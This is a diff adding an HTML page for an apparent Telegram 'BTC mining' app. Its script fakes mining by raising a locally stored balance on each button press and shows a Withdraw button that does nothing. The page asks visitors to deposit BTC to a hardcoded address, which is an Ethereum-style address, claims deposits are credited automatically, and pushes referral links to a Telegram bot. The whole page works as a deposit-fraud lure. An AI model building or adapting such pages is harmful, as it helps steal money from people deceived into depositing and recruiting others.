@@ -1,0 +1,206 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Mining</title>
+<style>
+    body {
+      margin: 0;
+      font-family: sans-serif;
+      background: url('https://i.ibb.co/cSsPD77g/images-20.jpg') no-repeat center center;
+      background-size: cover;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    .uid, .invite, .btc-price, .wallet-info, .deposit-info, .balance {
+      background: rgba(0,0,0,0.6);
+      padding: 10px 16px;
+      border-radius: 10px;
+      margin: 10px 0;
+      width: 100%;
+      max-width: 400px;
+      font-size: 16px;
+    }
+    .mining-btn {
+      padding: 16px 32px;
+      font-size: 20px;
+      background: #ffaa00;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      color: #000;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.4);
+      margin-top: 20px;
+    }
+    .countdown {
+      font-size: 20px;
+      margin-top: 12px;
+    }
+    .withdraw-btn {
+      margin-top: 10px;
+      background: #444;
+      color: white;
+      padding: 8px 20px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body><div class="tab-content" id="homeTab">
+<div class="uid" id="uid">UID: </div>
+<button class="mining-btn" onclick="startMining()">⛏️ Start Mining</button>
+<div class="countdown" id="countdown"></div>
+<div class="balance" id="balance">Your Balance: 0 BTC</div>
+<button class="withdraw-btn">Withdraw</button>
+<div class="wallet-info">
+<strong>Send BTC to:</strong><br/>
+    0xc3a1c0eef58db2c53b2fdba619fea16132742925
+  </div>
+<div class="deposit-info">
+<strong>How to deposit:</strong><br/>
+    Send BTC to the address above using any wallet or exchange.<br/>
+    Your balance will be updated automatically after confirmation.
+  </div>
+<div class="btc-price" id="btcPrice">BTC Price: Loading...</div>
+<div class="invite" id="invite">Invite link: </div>
+
+</div><script>
+    let uid = localStorage.getItem("uid");
+    if (!uid) {
+      uid = Math.floor(1000000 + Math.random() * 9000000);
+      localStorage.setItem("uid", uid);
+    }
+    document.getElementById("uid").innerText = "UID: " + uid;
+    document.getElementById("invite").innerText = "Invite link: https://t.me/MinerXfast_Bot?start=" + uid;
+
+    let balance = parseFloat(localStorage.getItem("btc_balance") || "0");
+    const balanceEl = document.getElementById("balance");
+    const countdownEl = document.getElementById("countdown");
+
+    function updateBalanceDisplay() {
+      balanceEl.innerText = "Your Balance: " + balance.toFixed(8) + " BTC";
+    }
+
+    function startMining() {
+      const now = Date.now();
+      const nextTime = now + 24 * 60 * 60 * 1000;
+      localStorage.setItem("mining_end", nextTime);
+      balance += 0.00018;
+      localStorage.setItem("btc_balance", balance.toString());
+      updateBalanceDisplay();
+      updateCountdown();
+    }
+
+    function updateCountdown() {
+      const end = parseInt(localStorage.getItem("mining_end"));
+      if (!end || isNaN(end)) return;
+
+      const interval = setInterval(() => {
+        const now = Date.now();
+        const distance = end - now;
+        if (distance <= 0) {
+          clearInterval(interval);
+          countdownEl.innerText = "⛏️ Ready to mine again!";
+          return;
+        }
+        const h = Math.floor((distance / (1000 * 60 * 60)) % 24);
+        const m = Math.floor((distance / (1000 * 60)) % 60);
+        const s = Math.floor((distance / 1000) % 60);
+        countdownEl.innerText = `Next mining in: ${h}h ${m}m ${s}s`;
+      }, 1000);
+    }
+
+    function fetchBTCPrice() {
+      fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd")
+        .then(res => res.json())
+        .then(data => {
+          document.getElementById("btcPrice").innerText = "BTC Price: $" + data.bitcoin.usd.toLocaleString();
+        })
+        .catch(() => {
+          document.getElementById("btcPrice").innerText = "BTC Price: Failed to load";
+        });
+    }
+
+    updateBalanceDisplay();
+    updateCountdown();
+    fetchBTCPrice();
+  </script>
+<div class="tab-content" id="marketsTab" style="display:none; text-align:center;">
+<h2>Bitcoin Market</h2>
+<p id="btcPriceMarket">BTC Price: Loading...</p>
+<img alt="BTC Chart" src="https://www.coindesk.com/arc/outboundfeeds/rss/?outputType=gif" style="width:80%; border-radius:10px;"/>
+</div>
+<div class="tab-content" id="accelerateTab" style="display:none; text-align:center;">
+<h2>Mining Plans</h2>
+<p>Coming soon...</p>
+</div>
+<div class="tab-content" id="earnTab" style="display:none; text-align:center;">
+<h2>Refer &amp; Earn</h2>
+<p>Your invite link:</p>
+<input id="refLink" readonly="" style="width:90%; padding:8px; border-radius:8px; border:none; text-align:center;" type="text"/>
+<br/><br/>
+<button onclick="copyReferral()" style="padding:10px 20px; border:none; border-radius:8px; background:#ffaa00; color:black;">Copy</button>
+</div>
+<div class="tab-content" id="walletTab" style="display:none; text-align:center;">
+<h2>Wallet</h2>
+<p>More features coming soon...</p>
+</div>
+<div id="bottom-nav" style="
+  position: fixed;
+  bottom: 0;
+  width: 100%;
+  background: rgba(0,0,0,0.8);
+  display: flex;
+  justify-content: space-around;
+  padding: 10px 0;
+  border-top: 1px solid #444;
+  z-index: 9999;
+">
+<button onclick="showTab('home')" style="background: none; border: none; color: white; font-size: 12px; text-align: center;">
+<div>🏠</div><div>Home</div>
+</button>
+<button onclick="showTab('markets')" style="background: none; border: none; color: white; font-size: 12px; text-align: center;">
+<div>📈</div><div>Markets</div>
+</button>
+<button onclick="showTab('accelerate')" style="background: none; border: none; color: white; font-size: 12px; text-align: center;">
+<div>🚀</div><div>Accelerate</div>
+</button>
+<button onclick="showTab('earn')" style="background: none; border: none; color: white; font-size: 12px; text-align: center;">
+<div>💰</div><div>Earn</div>
+</button>
+<button onclick="showTab('wallet')" style="background: none; border: none; color: white; font-size: 12px; text-align: center;">
+<div>👛</div><div>Wallet</div>
+</button>
+</div>
+<script>
+function showTab(tabName) {
+  const tabs = ['homeTab', 'marketsTab', 'accelerateTab', 'earnTab', 'walletTab'];
+  tabs.forEach(id => {
+    document.getElementById(id).style.display = (id === tabName + 'Tab') ? 'block' : 'none';
+  });
+}
+
+function copyReferral() {
+  const ref = document.getElementById("refLink");
+  ref.select();
+  ref.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  alert("Copied: " + ref.value);
+}
+
+// Fill referral input when loaded
+window.addEventListener("DOMContentLoaded", () => {
+  const uid = localStorage.getItem("uid");
+  document.getElementById("refLink").value = "https://t.me/MinerXfast_Bot?start=" + uid;
+});
+</script></body>
+</html>
